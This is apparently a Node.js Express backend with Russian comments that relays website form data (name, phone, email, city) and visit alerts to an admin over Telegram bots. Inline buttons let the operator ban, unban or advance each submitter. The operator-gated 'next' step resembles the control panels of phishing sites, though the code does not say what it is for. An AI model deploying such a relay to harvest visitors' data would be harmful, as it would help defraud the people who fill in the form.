const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

// CORS + JSON
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "*");
  next();
});

// боты
const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });

const adminId = process.env.ADMIN_CHAT_ID;

// базы
let bannedUsers = {};
let requests = {};
let userStatus = {};

// вход
app.post("/enter", (req, res) => {
  enterBot.sendMessage(adminId, "👀 Пользователь зашел на сайт");
  res.json({ ok: true });
});

// отправка
app.post("/send", (req, res) => {
  const data = req.body;

  if (bannedUsers[data.phone]) {
    return res.json({ ok: false });
  }

  const id = Date.now();

  requests[id] = data.phone;
  userStatus[id] = "wait";

  mainBot.sendMessage(
    adminId,
    `🆕 ЗАЯВКА ID: ${id}

📦 Услуга: ${data.service}

👤 Имя: ${data.name}
📞 Телефон: ${data.phone}
📧 Email: ${data.email}
🏙 Город: ${data.city}
💬 Комментарий: ${data.comment}`,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [
            { text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }
          ]
        ]
      }
    }
  );

  res.json({ ok: true, id });
});

// статус
app.get("/status/:id", (req, res) => {
  const id = req.params.id;
  res.json({ status: userStatus[id] || "wait" });
});

// кнопки
mainBot.on("callback_query", (q) => {
  const data = q.data;
  const id = data.split("_")[1];
  const phone = requests[id];

  if (!phone) {
    return mainBot.answerCallbackQuery(q.id, { text: "нет данных" });
  }

  if (data.startsWith("ban")) {
    bannedUsers[phone] = true;
    mainBot.answerCallbackQuery(q.id, { text: "🚫 забанен " + phone });
  }

  if (data.startsWith("unban")) {
    delete bannedUsers[phone];
    mainBot.answerCallbackQuery(q.id, { text: "✅ разбан " + phone });
  }

  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    mainBot.answerCallbackQuery(q.id, { text: "➡️ перевёл дальше" });
  }
});

// проверка
app.get("/", (req, res) => {
  res.send("ok");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER WORKING");
});
